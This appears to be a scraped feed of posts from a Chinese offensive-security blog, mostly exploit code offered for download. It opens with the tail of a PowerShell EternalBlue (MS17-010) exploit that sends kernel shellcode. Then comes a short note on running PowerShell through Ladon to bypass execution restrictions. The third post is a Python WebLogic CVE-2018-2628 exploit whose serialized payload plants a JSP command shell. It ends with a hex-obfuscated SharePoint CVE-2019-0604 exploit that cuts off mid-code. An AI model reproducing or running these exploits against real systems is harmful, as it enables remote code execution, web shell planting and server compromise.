#$pkt += 0xf0 # Security Blob: &lt;MISSING&gt; #$pkt += 0xff,0x00,0x00,0x00 # Native OS #$pkt += 0x00,0x00 # Native LAN manager #$pkt += 0x00,0x00 # Primary domain $pkt += $native_os $pkt += [Byte[]] (0x00) * 17 # Extra byte params return $pkt &#125; function make_smb1_anonymous_login_packet &#123; # Neither Rex nor RubySMB appear to support Anon login? [Byte[]] $pkt = [Byte[]] (0x00) # Session message $pkt += 0x00,0x00,0x88 # length $pkt += 0xff,0x53,0x4D,0x42 # SMB1 $pkt += 0x73 # Session Setup AndX $pkt += 0x00,0x00,0x00,0x00 # NT SUCCESS $pkt += 0x18 # Flags $pkt += 0x07,0xc0 # Flags2 $pkt += 0x00,0x00 # PID High $pkt += 0x00,0x00,0x00,0x00 # Signature1 $pkt += 0x00,0x00,0x00,0x00 # Signature2 $pkt += 0x00,0x00 # TreeID $pkt += 0xff,0xfe # PID $pkt += 0x00,0x00 # Reserved $pkt += 0x00,0x00 # UserID $pkt += 0x40,0x00 # MultiplexID $pkt += 0x0d # Word Count $pkt += 0xff # No further commands $pkt += 0x00 # Reserved $pkt += 0x88,0x00 # AndXOffset $pkt += 0x04,0x11 # Max Buffer $pkt += 0x0a,0x00 # Max Mpx Count $pkt += 0x00,0x00 # VC Number $pkt += 0x00,0x00,0x00,0x00 # Session key $pkt += 0x01,0x00 # ANSI pw length $pkt += 0x00,0x00 # Unicode pw length $pkt += 0x00,0x00,0x00,0x00 # Reserved $pkt += 0xd4,0x00,0x00,0x00 # Capabilities $pkt += 0x4b,0x00 # Byte count $pkt += 0x00 # ANSI pw $pkt += 0x00,0x00 # Account name $pkt += 0x00,0x00 # Domain name # Windows 2000 2195 $pkt += 0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x20,0x00,0x32 $pkt += 0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x20,0x00,0x32,0x00,0x31,0x00,0x39,0x00,0x35,0x00 $pkt += 0x00,0x00 # Windows 2000 5.0 $pkt += 0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x20,0x00,0x32 $pkt += 0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x20,0x00,0x35,0x00,0x2e,0x00,0x30,0x00,0x00,0x00 return $pkt&#125;function tree_connect_andx_request($Target, $userid) &#123; [Byte[]] $pkt = [Byte[]](0x00) #$pkt +=Message_Type' $pkt +=0x00,0x00,0x47 #$pkt +=Length' $pkt +=0xFF,0x53,0x4D,0x42 #$pkt +=server_component': .SMB $pkt +=0x75 #$pkt +=smb_command': Tree Connect AndX $pkt +=0x00,0x00,0x00,0x00 #$pkt +=nt_status' $pkt +=0x18 #$pkt +=flags' $pkt +=0x01,0x20 #$pkt +=flags2' $pkt +=0x00,0x00 #$pkt +=process_id_high' $pkt +=0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 #$pkt +=signature' $pkt +=0x00,0x00 #$pkt +=reserved' $pkt +=0x00,0x00 #$pkt +=tree_id' $pkt +=0x2F,0x4B #$pkt +=process_id' $pkt += $userid #$pkt +=user_id' $pkt +=0xC5,0x5E #$pkt +=multiplex_id' $ipc = \"\\\\\"+ $Target + \"\\IPC$\" $pkt +=0x04 # Word Count $pkt +=0xFF # AndXCommand: No further commands $pkt +=0x00 # Reserved $pkt +=0x00,0x00 # AndXOffset $pkt +=0x00,0x00 # Flags $pkt +=0x01,0x00 # Password Length $pkt +=0x1A,0x00 # Byte Count $pkt +=0x00 # Password $pkt += [system.Text.Encoding]::ASCII.GetBytes($ipc) # \\,0xxx.xxx.xxx.xxx\\IPC$ $pkt += 0x00 # null byte after ipc added by kev $pkt += 0x3f,0x3f,0x3f,0x3f,0x3f,0x00 # Service $len = $pkt.Length - 4 # netbios[1] =$pkt +=0x00' + struct.pack('&gt;H length) $hexlen = [bitconverter]::GetBytes($len)[-2..-4] $pkt[1] = $hexlen[0] $pkt[2] = $hexlen[1] $pkt[3] = $hexlen[2] return $pkt &#125;function smb_header($smbheader) &#123;$parsed_header =@&#123;server_component=$smbheader[0..3]; smb_command=$smbheader[4]; error_class=$smbheader[5]; reserved1=$smbheader[6]; error_code=$smbheader[6..7]; flags=$smbheader[8]; flags2=$smbheader[9..10]; process_id_high=$smbheader[11..12]; signature=$smbheader[13..21]; reserved2=$smbheader[22..23]; tree_id=$smbheader[24..25]; process_id=$smbheader[26..27]; user_id=$smbheader[28..29]; multiplex_id=$smbheader[30..31]; &#125;return $parsed_header&#125;function smb1_get_response($sock)&#123; $tcp_response = [Array]::CreateInstance(\"byte\", 1024) try&#123; $sock.Receive($tcp_response)| out-null &#125; catch &#123; Write-Verbose \"socket error, exploit may fail \" &#125; $netbios = $tcp_response[0..4] $smb_header = $tcp_response[4..36] # SMB Header: 32 bytes $parsed_header = smb_header($smb_header) return $tcp_response, $parsed_header&#125;function client_negotiate($sock)&#123;$raw_proto = negotiate_proto_request $sock.Send($raw_proto) | out-null return smb1_get_response($sock)&#125;function smb1_anonymous_login($sock)&#123; $raw_proto = make_smb1_anonymous_login_packet $sock.Send($raw_proto) | out-null return smb1_get_response($sock)&#125;function tree_connect_andx($sock, $Target, $userid)&#123; $raw_proto = tree_connect_andx_request $Target $userid $sock.Send($raw_proto) | out-null return smb1_get_response($sock)&#125;function smb1_anonymous_connect_ipc($Target)&#123; $client = New-Object System.Net.Sockets.TcpClient($Target,445) $sock = $client.Client client_negotiate($sock) | Out-Null $raw, $smbheader = smb1_anonymous_login $sock $raw, $smbheader = tree_connect_andx $sock $Target $smbheader.user_id return $smbheader, $sock&#125;function smb1_large_buffer($smbheader,$sock)&#123; $nt_trans_pkt = make_smb1_nt_trans_packet $smbheader.tree_id $smbheader.user_id # send NT Trans $sock.Send($nt_trans_pkt) | out-null $raw, $transheader = smb1_get_response($sock) #initial trans2 request $trans2_pkt_nulled = make_smb1_trans2_exploit_packet $smbheader.tree_id $smbheader.user_id \"eb_trans2_zero\" 0 #send all but the last packet for($i =1; $i -le 14; $i++) &#123; $trans2_pkt_nulled += make_smb1_trans2_exploit_packet $smbheader.tree_id $smbheader.user_id \"eb_trans2_buffer\" $i &#125; $trans2_pkt_nulled += make_smb1_echo_packet $smbheader.tree_id $smbheader.user_id $sock.Send($trans2_pkt_nulled) | out-null smb1_get_response($sock) | Out-Null&#125;function smb1_free_hole($start) &#123; $client = New-Object System.Net.Sockets.TcpClient($Target,445) $sock = $client.Client client_negotiate($sock) | Out-Null if($start) &#123; $pkt = make_smb1_free_hole_session_packet (0x07,0xc0) (0x2d,0x01) (0xf0,0xff,0x00,0x00,0x00) &#125; else &#123; $pkt = make_smb1_free_hole_session_packet (0x07,0x40) (0x2c,0x01) (0xf8,0x87,0x00,0x00,0x00) &#125; $sock.Send($pkt) | out-null smb1_get_response($sock) | Out-Null return $sock&#125; function smb2_grooms($Target, $grooms, $payload_hdr_pkt, $groom_socks)&#123; for($i =0; $i -lt $grooms; $i++) &#123; $client = New-Object System.Net.Sockets.TcpClient($Target,445) $gsock = $client.Client $groom_socks += $gsock $gsock.Send($payload_hdr_pkt) | out-null &#125; return $groom_socks &#125;function smb_eternalblue($Target, $grooms, $Shellcode) &#123; #replace null bytes with your shellcode [Byte[]] $payload = [Byte[]]($Shellcode) $shellcode = make_kernel_user_payload($payload) $payload_hdr_pkt = make_smb2_payload_headers_packet $payload_body_pkt = make_smb2_payload_body_packet($shellcode) Write-Verbose \"Connecting to target for activities\" $smbheader, $sock = smb1_anonymous_connect_ipc($Target) $sock.ReceiveTimeout =2000 Write-Verbose \"Connection established for exploitation.\" # Step 2: Create a large SMB1 buffer Write-Verbose \"all but last fragment of exploit packet\" smb1_large_buffer $smbheader $sock # Step 3: Groom the pool with payload packets, and open/close SMB1 packets # initialize_groom_threads(ip, port, payload, grooms) $fhs_sock = smb1_free_hole $true $groom_socks =@() $groom_socks = smb2_grooms $Target $grooms $payload_hdr_pkt $groom_socks $fhf_sock = smb1_free_hole $false $fhs_sock.Close() | Out-Null $groom_socks = smb2_grooms $Target 6 $payload_hdr_pkt $groom_socks $fhf_sock.Close() | out-null Write-Verbose \"Running final exploit packet\" $final_exploit_pkt = $trans2_pkt_nulled = make_smb1_trans2_exploit_packet $smbheader.tree_id $smbheader.user_id \"eb_trans2_exploit\" 15 try&#123; $sock.Send($final_exploit_pkt) | Out-Null $raw, $exploit_smb_header = smb1_get_response $sock Write-Verbose (\"SMB code: \" + [System.BitConverter]::ToString($exploit_smb_header.error_code)) &#125; catch &#123; Write-Verbose \"socket error, exploit may fail horribly\" &#125; Write-Verbose \"Send the payload with the grooms\" foreach ($gsock in $groom_socks) &#123; $gsock.Send($payload_body_pkt[0..2919]) | out-null &#125; foreach ($gsock in $groom_socks) &#123; $gsock.Send($payload_body_pkt[2920..4072]) | out-null &#125; foreach ($gsock in $groom_socks) &#123; $gsock.Close() | out-null &#125; $sock.Close()| out-null &#125;$VerbosePreference = \"continue\"for ($i=0; $i -lt $MaxAttempts; $i++) &#123; $grooms = $InitialGrooms + $GROOM_DELTA*$i smb_eternalblue $Target $grooms $Shellcode&#125;&#125; Downloadhttps://github.com/k8gege/MS17010EXP","categories":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/categories/Exp/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Rce","slug":"Rce","permalink":"http://k8gege.org/tags/Rce/"},{"name":"MS17010","slug":"MS17010","permalink":"http://k8gege.org/tags/MS17010/"}]},{"title":"Kali 2019 & Ladon无PowerShell执行脚本","slug":"KaliLadon无PowerShell执行脚本","date":"2019-12-06T16:00:00.000Z","updated":"2020-01-11T07:22:36.843Z","comments":true,"path":"p/32e1a912.html","link":"","permalink":"http://k8gege.org/p/32e1a912.html","excerpt":"","text":"关于Kali &amp; PowerShell最近Kali出了年度最终版2019.4，该版本主存储库集成了PowerShell，可apt一键安装。实际上想用PowerShell也不是非要等2019.4版本，和很多程序一样，可以自己下载安装。因为微软PowerShell早在几年前就支持跨平台了还有.net程序，听说mono被微软收购了。只是多打几条命令而已，不是说之前版本的Kali就不支持PowerShell，真佩服国内小编。当然也可以在不安装PowerShell的环境下通过Ladon来执行PowerShell脚本。 PowerShell例子以下代码为Ladon插件例子，非常简单只需一个函数Ladon以及返回结果即可。 123456function Ladon ()&#123;param([string]$ip) #write-output $ip$result&#x3D;-Join(&quot;PsDemo &quot;,$ip)return $result&#125; Ladon下载1wget https://github.com/k8gege/Ladon/raw/master/KaliLadon -O Ladon 安装mono运行库Linux版Ladon需mono,类似jar需java，py需python环境等mono执行兼容性、稳定性以及效率在Linux下不如Win系统 1apt install mono-runtime Ladon执行PowerShell1mono Ladon 123456 test.ps1 Kali 2019.4 x64 Ubuntu 18.04 x64 Windows绕过PowerShell限制使用Ladon执行，就不存在PowerShell默认禁止执行脚本的限制 自定义PowerShell脚本其它功能脚本通过以下函数调用即可，或者返回空值的Ladon函数调用代码。如Base64批量密码解密 12345678910111213function Ladon ()&#123;param([string]$ip) $pass&#x3D;ConvertFrom-Base64String($ip)$result&#x3D;-Join($ip,&quot; &quot;,$pass)return $result&#125;# Convert base64 string to stringfunction ConvertFrom-Base64String([string]$string)&#123; $byteArray &#x3D; [Convert]::FromBase64String($string) [System.Text.UnicodeEncoding]::UTF8.GetString($byteArray)&#125; 关于.net跨平台关于.net跨平台有两个选择，一是mono，二是.net core，都是微软出品三是PowerShell Core(内嵌.net，linux下未测，毕竟默认无.net运行库) 完全脱离运行库编译程序都很大，好在mono运行库安装比PY、JAVA都要快仅需一两分钟，也就是说，假如需要在目标执行，还可以只传一个小程序不像Python和Java安装了运行库，需要运行程序可能还得安装其它依赖库意味着有些程序离开开发环境可能无法运行(有些系统一些模块根本装不上)同样存在着兼容性问题，从奇葩环境看似乎.net比py和java有着更大优势需要将程序上传至目标，意味着可能出不了网或无法代理等奇葩网络环境。我这里考虑的都是极差环境，只代理就顺利使用相关工具的永远体会不到。当然有些功能PYTHON实现会比.NET简单很多倍，且.net可能还实现不了。反过来也一样有些功能.NET，我不像别人喜欢哪门语言就无脑地吹哪门，有缺点不肯承认还要强制说好，你和他说PY有什么缺点就像骂了他一样。我从不否认任何语言的优点和缺点，因为任何语言只要工作需要我就用。常用.net，无非是程序小这个巨大优势，程序小产生的流量自然就很小。使用再垃圾的远控或者再垃圾的网络环境都有办法把程序传到目标机器。如果远控或WebShell像Cobal Strike一样支持内存加载，就更不用担心。","categories":[{"name":"Kali","slug":"Kali","permalink":"http://k8gege.org/categories/Kali/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Kali","slug":"Kali","permalink":"http://k8gege.org/tags/Kali/"},{"name":"PowerShell","slug":"PowerShell","permalink":"http://k8gege.org/tags/PowerShell/"}]},{"title":"CVE-2018-2628 Weblogic GetShell Exploit","slug":"CVE-2018-2628","date":"2019-12-02T16:00:00.000Z","updated":"2020-01-10T15:12:20.684Z","comments":true,"path":"p/b8e58f69.html","link":"","permalink":"http://k8gege.org/p/b8e58f69.html","excerpt":"","text":"漏洞简介 漏洞威胁：RCE--远程代码执行 漏洞组件：weblogic 影响版本：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3 代码: # -*- coding: utf-8 -*- # Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628) from future import print_function import binasciiimport osimport socketimport sysimport time def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client): #k8cmd weblogic http://192.11.22.67:7001/bea_wls_internal/wlscmd.jsp return &quot;aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d43c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d0d0a253e7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c776c73636d642e6a7370c0807702005c7878&quot;def t3_handshake(sock, server_addr): sock.connect(server_addr) sock.send(‘74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a’.decode(‘hex’)) time.sleep(1) sock.recv(1024) print(‘handshake successful’) def build_t3_request_object(sock, port): data1 = ‘000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371’ data2 = ‘007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07’.format(‘{:04x}’.format(dport)) data3 = ‘1a7727000d3234322e323134’ data4 = ‘2e312e32353461863d1d0000000078’ for d in [data1,data2,data3,data4]: sock.send(d.decode(‘hex’)) time.sleep(2) print(‘send request payload successful,recv length:%d’%(len(sock.recv(2048)))) def send_payload_objdata(sock, data): payload=’056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000’ payload+=data payload+=’fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff’ payload = ‘%s%s’%(‘{:08x}’.format(len(payload)/2 + 4),payload) sock.send(payload.decode(‘hex’)) time.sleep(2) sock.send(payload.decode(‘hex’)) res = ‘’ try: while True: res += sock.recv(4096) time.sleep(0.1) except Exception: pass return res def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client): print(‘——————————————–’) print(‘Weblogic GetShell Exploit for CVE-2018-2628’) print(‘by k8gege build 20180426’) print(‘——————————————–’) print(“sending payload”); sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(8) server_addr = (dip, dport) t3_handshake(sock, server_addr) build_t3_request_object(sock, dport) payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client) rs=send_payload_objdata(sock, payload) #print(&apos;response: &apos; + rs) print(&apos;exploit completed!&apos;) print(&apos;shell: http://&apos;+dip+&apos;:&apos;+str(dport)+&quot;/bea_wls_internal/wlscmd.jsp&quot;) print(&apos;Please use the k8fly connection shell&apos;)if name==”main“: if len(sys.argv) != 3: print(‘——————————————–’) print(‘Weblogic GetShell Exploit for CVE-2018-2628’) print(‘by k8gege build 20180426’) print(‘Usage: exploit [weblogic ip] [weblogic port]’) print(‘——————————————–’) sys.exit() dip = sys.argv[1] dport = int(sys.argv[2]) exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;) &nbsp;演示: 附件说明: 0x001 .net版exp功能1 探测weblogic版本2 GetShell运行环境 .net 2.00x002 python版Exp-2018-2628.exe 附python代码Poc-2018-2628.exe 仅检测是否存在漏洞 链接: https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar &nbsp;","categories":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/categories/Exp/"},{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"}],"tags":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"Weblogic","slug":"Weblogic","permalink":"http://k8gege.org/tags/Weblogic/"},{"name":"GetShell","slug":"GetShell","permalink":"http://k8gege.org/tags/GetShell/"}]},{"title":"CVE-2019-0604 SharePoint GetShell Exploit","slug":"CVE-2019-0604","date":"2019-12-02T16:00:00.000Z","updated":"2020-01-10T15:12:14.834Z","comments":true,"path":"p/e896a7d1.html","link":"","permalink":"http://k8gege.org/p/e896a7d1.html","excerpt":"","text":"漏洞信息 Microsoft SharePoint是美国微软（Microsoft）公司的一套企业业务协作平台。该平台用于对业务信息进行整合，并能够共享工作、与他人协同工作、组织项目和工作组、搜索人员和信息。 Microsoft SharePoint 远程代码执行漏洞（CVE-2019-0594、CVE-2019-0604，高危）：Microsoft SharePoint软件无法检查应用程序包源标记时触发该漏洞。攻击者可在SharePoint应用程序池和SharePoint服务器中执行任意代码。 影响版本： Microsoft SharePoint Enterprise Server 2016 SharePoint Foundation 2013 SP1 harePoint Server 2010 SP2 SharePoint Server 2019。 攻击入口 ItemPicker Web 控件实际上从来没有在一个 .aspx 页面中使用过。但是看看它基类型的用法，EntityEditorWithPicker，说明在 /_layouts/15/Picker.aspx 应该有一个 Picker.aspx 文件使用了它。 该页面要求使用选择器对话框的类型通过 URL 的 PickerDialogType 参数的形式提供。在这里，可以使用以下两种 ItemPickerDialog 类型中的任何一种： &middot; Microsoft.SharePoint.WebControls.ItemPickerDialog in Microsoft.SharePoint.dll &middot; Microsoft.SharePoint.Portal.WebControls.ItemPickerDialog in Microsoft.SharePoint.Portal.dll 利用第一种 PickerDialogType 类型 &nbsp; PoC 当表单提交 ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData 的值以 &ldquo;__&rdquo; 为开头时(类似于&ldquo;_dummy&rdquo;)， EntityInstanceIdEncoder.DecodeEntityInstanceId(string) 处的断点将显示以下情况：而调用另外一种 ItemPickerDialog 类型时，函数调用栈只是在最上面的两个有所不同。 这表明 ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData 的数据最终出现在了 EntityInstanceIdEncoder.DecodeEntityInstanceId(string) 中。 剩下的只需要拷贝实例 ID 和构造一个 XmlSerializer 的 payload 就可以了。 &nbsp; 补充： 作者说只要构造一个XML序列化的Payload就可以了，但是Payload提交到哪里呢？ 原文中只说了一半,完整POST以及具体参数如下： URL： /Picker.aspx?PickerDialogType=控件的程序集限定名&nbsp; 参数： ctl00%24PlaceHolderDialogBodySection%24ctl05%24hiddenSpanData=payload 实际上还需访问Picker.aspx附带的其它参数，测试我不附带其它参数时提交表单是失败的。 &nbsp; 此漏洞分析文章出来时就想搭环境测试了，第一天下载APP安装后发现下错了， 加上项目未遇到该程序，搭环境也浪费时间懒得弄，就暂时丢一边了。 今天发现上周已经弄了一半，又重新研究了一下。 &nbsp; 详情请看原文，我想以下文章应该不少人看过了吧，所谓原理很多人都能说得出来 就是都在等一个真正能用的EXP吧，哈哈哈，我就是传说中的云黑客&ldquo;鸡你太美&rdquo;！ 原文(英文): https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability 译文(中文): https://www.anquanke.com/post/id/173476 &nbsp; EXP #cve-2019-0604 SharePoint RCE exploit #date: 20190618 #author: k8gege import urllib import urllib2 import sys import requests url0 = sys.argv[1] url1 = '/_layouts/15/Picker.aspx?PickerDialogType=' url = url0 + url1 shellurl=url0+'/_layouts/15/ua.aspx' exp='\\x63\\x76\\x65\\x2D\\x32\\x30\\x31\\x39\\x2D\\x30\\x36\\x30\\x34\\x20\\x53\\x68\\x61\\x72\\x65\\x50\\x6F\\x69\\x6E\\x74\\x20\\x52\\x43\\x45\\x20\\x65\\x78\\x70\\x6C\\x6F\\x69\\x74' paySpanData='\\x63\\x74\\x6C\\x30\\x30\\x24\\x50\\x6C\\x61\\x63\\x65\\x48\\x6F\\x6C\\x64\\x65\\x72\\x44\\x69\\x61\\x6C\\x6F\\x67\\x42\\x6F\\x64\\x79\\x53\\x65\\x63\\x74\\x69\\x6F\\x6E\\x24\\x63\\x74\\x6C\\x30\\x35\\x24\\x68\\x69\\x64\\x64\\x65\\x6E\\x53\\x70\\x61\\x6E\\x44\\x61\\x74\\x61'; paySection='\\x50\\x6C\\x61\\x63\\x65\\x48\\x6F\\x6C\\x64\\x65\\x72\\x44\\x69\\x61\\x6C\\x6F\\x67\\x42\\x6F\\x64\\x79\\x53\\x65\\x63\\x74\\x69\\x6F\\x6E' ct1='\\x63\\x74\\x6C\\x30\\x30\\x24' ct2='\\x24\\x63\\x74\\x6C\\x30\\x35' spver = '\\x4D\\x69\\x63\\x72\\x6F\\x73\\x6F\\x66\\x74\\x2E\\x53\\x68\\x61\\x72\\x65\\x50\\x6F\\x69\\x6E\\x74\\x2E\\x57\\x65\\x62\\x43\\x6F\\x6E\\x74\\x72\\x6F\\x6C\\x73\\x2E\\x49\\x74\\x65\\x6D\\x50\\x69\\x63\\x6B\\x65\\x72\\x44\\x69\\x61\\x6C\\x6F\\x67\\x2C\\x4D\\x69\\x63\\x72\\x6F\\x73\\x6F\\x66\\x74\\x2E\\x53\\x68\\x61\\x72\\x65\\x50\\x6F\\x69\\x6E\\x74\\x2C\\x56\\x65\\x72\\x73\\x69\\x6F\\x6E\\x3D\\x31\\x35\\x2E\\x30\\x2E\\x30\\x2E\\x30\\x2C\\x43\\x75\\x6C\\x74\\x75\\x72\\x65\\x3D\\x6E\\x65\\x75\\x74\\x72\\x61\\x6C\\x2C\\x50\\x75\\x62\\x6C\\x69\\x63\\x4B\\x65\\x79\\x54\\x6F\\x6B\\x65\\x6E\\x3D\\x37\\x31\\x65\\x39\\x62\\x63\\x65\\x31\\x31\\x31\\x65\\x39\\x34\\x32\\x39\\x63' uapay='\\x55\\x73\\x65\\x72\\x2D\\x41\\x67\\x65\\x6E\\x74' 